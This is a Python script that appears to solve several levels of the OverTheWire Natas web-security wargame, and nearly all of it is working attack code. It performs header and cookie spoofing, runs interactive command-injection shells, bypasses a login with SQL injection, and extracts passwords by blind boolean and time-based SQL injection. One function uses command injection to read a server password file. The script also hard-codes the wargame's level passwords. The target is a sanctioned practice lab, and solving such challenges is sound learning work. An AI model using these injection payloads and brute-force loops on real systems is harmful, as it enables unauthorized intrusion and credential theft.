#!/usr/bin/python3 

import requests, sys, re, base64,signal, time, string
from bs4 import BeautifulSoup

def sig_handler(sig,frane):
        print("\n\n[*] Saliendo..\n")
        sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)


def natas5():
    url = "http://natas4.natas.labs.overthewire.org/index.php"
    password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" 
    headers = {'Referer' :'http://natas5.natas.labs.overthewire.org/'}
    response = requests.get(url, headers=headers, auth=("natas4",password))
    text = BeautifulSoup(response.content, 'html.parser')
    content = (text.find('div', id= 'content')).text
    password = re.sub("Refresh page|\n","",content)

    print(password)

natas5()
url2 = "http://natas5.natas.labs.overthewire.org/"
password2 = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" 
def natas6(url,password):
    cookies = {'loggedin': '1'}
    response = requests.get(url, cookies=cookies, auth=("natas5",password2))
    text = BeautifulSoup(response.content, 'html.parser')
    content = text.find('div', id= 'content')
    print(content.text)
natas6(url2,natas6)
def natas8():
    url='http://natas8.natas.labs.overthewire.org/'
    password='DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe'
    encoded_key='3d3d516343746d4d6d6c315669563362'
    fromhex=bytes.fromhex(encoded_key).decode('utf-8')
    reverse=fromhex[::-1]
    key=str(base64.b64decode(reverse),"utf-8")
    data = {
            'secret':key,
            'submit':'Enviar consulta'
            }
    headers={'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148'}
    response = requests.post(url,auth=("natas8",password),data=data,headers=headers)
    text = BeautifulSoup(response.content, 'html.parser')
    content = (text.find('div', id= 'content')).text
    password = re.sub("Input secret:|View sourcecode|\n","",content)
    print(password)
natas8()
def natas9():
    url='http://natas9.natas.labs.overthewire.org/'
    password='W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
    while True:
        command = input("#>")
        payload = f"?needle=pass;{command};&submit=Search"
        response = requests.get(url+payload,auth=("natas9",password))
        soup = BeautifulSoup(response.content, 'html.parser')
        output = soup.find('pre')
        print(output.text)
#natas9()
def natas10():
    url='http://natas10.natas.labs.overthewire.org/'
    password='nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
    while True:
        command = input("#>")
        payload = f"?needle=pass%0A{command}&submit=Search"
        response = requests.get(url+payload,auth=("natas10",password))
        soup = BeautifulSoup(response.content, 'html.parser')
        output = soup.find('pre')
        print(output.text)
#natas10()
def natas11():
    url="http://natas11.natas.labs.overthewire.org/?bgcolor=%23ffffff"
    password="U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK"
    cookies = {'data': 'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'}
    response = requests.get(url, cookies=cookies, auth=("natas11",password))
    text = BeautifulSoup(response.content, 'html.parser')
    content = (text.find('div', id= 'content')).text
    password=re.sub("Cookies are protected with XOR encryption|Background color:|View sourcecode|\n","",content)
    print(password)
natas11()
def natas14():
    url='http://natas14.natas.labs.overthewire.org/'
    password='Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
    payload={
            'username':'natas15"OR 1=1#',
            'password':'123'
            }
    response = requests.post(url, auth=("natas14",password),data=payload)
    soup = BeautifulSoup(response.content, 'html.parser')
    content = (soup.find('div', id= 'content')).text
    password = re.sub("View|Successful login!|sourcecode|\n","",content)
    print(password)
natas14()
# SQL injection error based 
def natas15():
    url="http://natas15.natas.labs.overthewire.org/?debug"
    password="AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
    session = requests.session()
    session.auth=('natas15',password)
    filtered=''
    passwordnatas16=''
    allchars = string.ascii_letters + string.digits
    #Econtrando el password para natas16 
    for char in allchars: 
        payload=f'natas16" AND password LIKE BINARY "%{char}%" #'
        Data = {'username':payload}
        response = session.post(url,data=Data)
        if "This user exists" in response.text:
            filtered = filtered + char 
    for i in range(0,33):
        for passwd in filtered:
            payload2=f'natas16" AND password LIKE BINARY "{passwordnatas16}{passwd}%" #'
            Data = {'username':payload2}
            response = session.post(url, data=Data)
    
            if "This user exists" in response.text:
                passwordnatas16 = passwordnatas16 + passwd
                break 
    print("The password for Natas16 is " + passwordnatas16)
#natas15()
# Command injection error 
def natas16():
    url="http://natas16.natas.labs.overthewire.org/"
    password="WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
    filtered= ''
    passwd= ''
    allchars = string.ascii_letters + string.digits 
    for char in allchars:
        payload=f'?needle=doomed$(grep {char} /etc/natas_webpass/natas17)&submit=Search'
        response = requests.get(url+payload,auth=("natas16",password))
        if 'doomed' not in response.text:
            filtered= filtered + char
    for i in range(32):
        for p in filtered:
            payload2=f'?needle=doomed$(grep ^{passwd+p} /etc/natas_webpass/natas17)&submit=Search'
            response = requests.get(url+payload2, auth=("natas16",password))
            if "doomed" not in response.text:
                passwd = passwd +p 
                break
    print("The password for Natas17 is " + passwd)

#natas16()
# SQL INJECTION TIME BASED :)
def natas18():
    url="http://natas17.natas.labs.overthewire.org/?debug"
    password="8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
    headers={'Content-Type':'application/x-www-form-urlencoded'}    
    allchars = string.ascii_letters + "ñ" + string.digits 
    filtered=""
    passwd=""
    session = requests.session()
    session.auth=('natas17',password)

    for char in allchars:
        sql=f'natas18" and password LIKE BINARY "%{char}%" and sleep(5)#'
        data = {'username':sql}
        r = session.post(url, data=data)
        if(r.elapsed.seconds >= 5):
            filtered= filtered + char 
    for i in range(0,32):        
        for c in filtered:
            payload=f'natas18"and password LIKE BINARY "{passwd + c}%" AND SLEEP(5)#'
            Data = {'username':payload}
            re = session.post(url, data=Data)
            if(re.elapsed.seconds >= 5):
                passwd = passwd + c 
                break
    print("The password for natas 18 is " + passwd)

#natas18()


